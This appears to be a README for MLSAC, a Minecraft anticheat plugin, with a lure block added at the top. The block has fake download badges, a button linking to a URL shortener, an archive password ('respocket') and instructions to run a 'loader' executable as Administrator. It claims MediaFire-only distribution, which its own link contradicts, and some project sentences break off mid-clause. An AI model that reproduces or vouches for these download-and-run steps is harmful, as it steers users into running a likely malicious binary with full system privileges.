<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# MLSAC 2.1.0 an AI anticheat for Minecraft servers

**MLSAC** is a machine-learning anticheat. The plugin watches how players fight — aim, clicks, movement
around the target — and sends compact feature windows to the MLSAC cloud, where neural networks score
them for KillAura, TriggerBot, AimAssist and Reach. What happens to a cheater (alerts, damage
## Requirements

- Paper and forks (Purpur, Pufferfish, Leaf…), Spigot, Folia
- Minecraft 1.16.5 – 26.x
- Java 17+
- A licence key from mlsac.net (there is a free plan)

PacketEvents is bundled — nothing else to install. WorldGuard is optional (regions without checks).

## Install

1. Stop the server; remove an old MLSAC 1.x jar if there is one.
2. Put the jar into `plugins/` and start the server.
3. Paste your licence key into `plugins/MLSAC/config.yml` → `api-key`, then `/mlsac reload`.
4. Set up models, punishments and menus in **Configs** on mlsac.net.

## Building from source

```bash
./gradlew build
```

Jars land in `build/dist/`. Modules: `core` (backend link, config, packets), `pipeline` (feature
extraction and windows), `features` (alerts, menus, nametags, punishments), `suppression` (suppression
ladder), `app` (bootstrap).

> The public source does not contain the protected transport used by the official build for the Ultra
> model. A build from this repository talks to the backend over the plain protocol; Ultra on the
> newest protocol needs the official jar from mlsac.net.

# MLSAC 2.1.0 это ИИ-античит для серверов Minecraft

**MLSAC** — античит на машинном обучении. Плагин смотрит, как игрок дерётся: прицел, клики, движение
вокруг цели, — и отправляет компактные окна признаков в облако MLSAC. Там нейросети оценивают их на
KillAura, TriggerBot, AimAssist и Reach. Что делать с читером (алерты, снижение урона, кики, баны),
## Требования

- Paper и форки (Purpur, Pufferfish, Leaf…), Spigot, Folia
- Minecraft 1.16.5 – 26.x
- Java 17+
- Ключ лицензии с mlsac.net (есть бесплатный тариф)

PacketEvents уже внутри — больше ничего ставить не нужно. WorldGuard по желанию (регионы без проверки).

## Установка

1. Останови сервер; если стоял MLSAC 1.x, удали старый jar.
2. Положи jar в `plugins/` и запусти сервер.
3. Вставь ключ лицензии в `plugins/MLSAC/config.yml` → `api-key`, затем `/mlsac reload`.
4. Модели, наказания и меню настраиваются во вкладке **«Конфиги»** на mlsac.net.

## Сборка из исходников

```bash
./gradlew build
```

Jar появятся в `build/dist/`.

> В открытых исходниках нет защищённого транспорта, которым официальная сборка общается с моделью
> Ultra. Сборка из этого репозитория работает по обычному протоколу; Ultra на новейшем протоколе —
> только с официальным jar с mlsac.net.


---

MLSAC Source-Available License
